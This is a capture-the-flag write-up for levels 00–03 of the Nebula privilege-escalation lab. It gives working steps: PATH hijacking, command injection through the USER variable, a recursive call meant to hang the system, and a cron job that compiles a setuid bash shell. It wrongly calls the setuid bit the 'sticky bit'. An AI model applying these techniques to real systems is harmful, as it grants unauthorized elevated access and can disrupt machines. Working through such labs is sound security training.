Nebula Exec:

The purpose of every (AFAIK) exercise is to run the command `getflag`
as the user flagXX.

### Level00:

find a program with set uid that will run as the "flag00" user.

Solution


Find the account of the user `flag00` which is in `/home/flag00`
Then run an ls to find his uid:
```
ls -nl /home/flag00
```
With the user id number use the comand find to find a file
```
find / -uid 999
```
The file which we need to find is `/rofs/bin/.../flag00`, when we run this exe
we get a shell with the user `flag00`, now we can run the command `getflag`.


### Level01

Find the vulnerability in this code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}

```

This exercise is related to the `/usr/bin/env` which does not takes any user
defined variables. Which can be good or it can be used to override the system
path.

The quiz asks to find how to use the executable to execute any program.
Here is my solution:
```
$ cat > ~/echo.c
#include <unistd.h>
main()
{
  setresgid(998, 998, 998); // here we use the flag01 uid and gid
  setresuid(998, 998, 998);
  system("/bin/bash");
  0==0;
}
^D
$ gcc echo.c -o echo
$ PATH=/home/level01/:$PATH
$ ./flag01
$ ./getflag
```

What we are doing is to use the fact that env takes the environment variables
like PATH and uses that to execute the commands unless we specify a different
value. Also the system searches the PATH in order, this is why we set our home
directory first in the PATH variable. Then when the `system` is called it finds
our executable `echo` and uses it to acomplish what is being asked in the string

### Level02

The quiz here is the same, exploit the program to execute any program that we
may want.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

This is similar to the last exercise, now we can override the `USER` variable
and use shell logic operators to make the program to execute any input as long
as it is well formed.

Solution:

```
$ cat > ~/create_shell.c
#include <unistd.h>
main()
{
  setresgid(997, 997, 997); // here we use the flag02 uid and gid
  setresuid(997, 997, 997);
  system("/bin/bash");
  0==0;
}
^D
$ gcc create_shell.c -o create_shell
$ USER="msg && create_shell"
$ PATH=/home/level02/:$PATH
$ ./flag02
$ /bin/getflag
```

the ls command can be replaced by our shell or any other command. For example we
could crash/hang/lag the system  by calling the same program recursively:

```
$ USER="msg && ./flag02 && echo"
$ ./flag02
```

### Level03

Check the files in /home/flag03. There is a crontab that is called every couplpe
of minutes.
For this we need to check crontab to see which jobs are scheduled.

There is no description of what is the target for this level, but a search shows
that the target of this level is to execute a bash as the user `flag03`.

For this we can use the calls to `setresuid` and `setresgid` and also the
sticky bit which allows to run the program as the user who created it, not as
the user executing the file.

The solution:

```
$ cat > runme.c
#include <unistd.h> main() {
  setresgid(996,996,996);
  setresuid(996,996,996);
   system("/bin/bash");
    0==0;}
^D
cp runme.c /tmp
```
Now we need the cron job to compile and create an executable for us which will
create a shell for us.
```
#!/bin/bash
gcc /tmp/runme.c -o /home/flag03/shell_flag
chmod +sx /home/flag03/shell_flag
```

Make the last schipt executable and add it to the `writable.d` directory.
Thi will generate an executable with the sticky bit, which will run the program
with the id of the flag03 user, and will create a shell for us. There we can
`getflag`.
